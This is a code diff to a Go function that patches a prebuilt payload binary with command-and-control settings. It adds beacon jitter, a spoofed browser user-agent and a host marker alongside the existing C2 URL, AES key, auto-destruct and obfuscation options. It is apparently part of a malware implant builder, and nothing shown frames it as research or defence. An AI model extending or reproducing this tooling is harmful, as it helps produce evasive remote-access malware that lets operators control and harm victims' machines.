@@ -27,21 +27,30 @@ const (
 
 	// SleepTimeMarker: 16 bytes
 	SleepTimeMarker = "ST_DATA_INT_0000"
+	
+	// JitterMarker: 16 bytes
+	JitterMarker = "JT_DATA_INT_0030"
 
 	// EncryptionSaltMarker: 32 bytes
 	EncryptionSaltMarker = "SYSTEM_PROVIDER_CRYPTO_KDF_SALT_"
 
 	// ObfuscationMarker: 15 bytes
 	ObfuscationMarker = "OBF_MODE_STRICT"
+
+	// UAMarker: 128 bytes
+	UAMarker = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36XXXXXXXXXXXXXXXXXXXX"
+	
+	// HostMarker: 64 bytes
+	HostMarker = "SYSTEM_CONFIG_DATA_HOST_MAPPING_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX"
 )
 
 // PatchPayload performs the binary surgery to inject configuration
-func PatchPayload(raw []byte, c2url string, aesKey string, heartbeat int, dnsResolver string, autoDestruct bool, sleepTime int, salt string, obfMode string) ([]byte, error) {
+func PatchPayload(raw []byte, c2url string, aesKey string, heartbeat int, jitter int, dnsResolver string, autoDestruct bool, sleepTime int, salt string, obfMode string) ([]byte, error) {
 	// Create a copy to ensure we don't modify the original template (embed.FS is read-only)
 	data := make([]byte, len(raw))
 	copy(data, raw)
 
-	log.Printf("Starting payload patching. URL: %s, Heartbeat: %d, AutoDestruct: %v, SleepTime: %d", c2url, heartbeat, autoDestruct, sleepTime)
+	log.Printf("Starting payload patching. URL: %s, Heartbeat: %d, Jitter: %d, AutoDestruct: %v, SleepTime: %d", c2url, heartbeat, jitter, autoDestruct, sleepTime)
 
 	// 1. Patch Server URL
 	urlMarkers := []string{
@@ -97,6 +106,15 @@ func PatchPayload(raw []byte, c2url string, aesKey string, heartbeat int, dnsRes
 	
 	if err := replaceInPlace(data, HeartbeatMarker, len(HeartbeatMarker), hbString); err != nil {
 		log.Printf("⚠️ Warning: Could not find Heartbeat placeholder '%s'.", HeartbeatMarker)
+	}
+	
+	// 3.1 Patch Jitter
+	jitterVal := jitter
+	if jitterVal < 0 { jitterVal = 0 }
+	if jitterVal > 100 { jitterVal = 100 }
+	jitterString := fmt.Sprintf("JT_DATA_INT_%04d", jitterVal)
+	if err := replaceInPlace(data, JitterMarker, len(JitterMarker), jitterString); err != nil {
+		log.Printf("⚠️ Warning: Could not find Jitter placeholder.")
 	}
 
 	// 4. Patch DNS Resolver
